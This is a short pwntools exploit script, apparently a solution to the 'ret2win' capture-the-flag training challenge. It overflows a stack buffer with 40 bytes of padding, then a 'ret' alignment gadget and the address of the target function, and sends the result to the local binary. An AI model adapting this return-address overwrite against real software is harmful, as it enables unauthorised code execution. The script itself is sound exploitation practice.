from pwn import *

context.arch = 'amd64'
prog = process("./ret2win")

payload = b'a' * 40
# ret in ret2win binary to fix movaps issue
payload += p64(0x000000000040053e)
# ret2win function
payload += p64(0x0000000000400756)
print(payload)

with open("./payload.txt", "wb+") as f:
    f.write(payload)

output = prog.recvuntil(">")
print(output.decode("utf-8"))

prog.clean()

prog.sendline(payload)

output = prog.recvall()
print(output.decode("utf-8"))
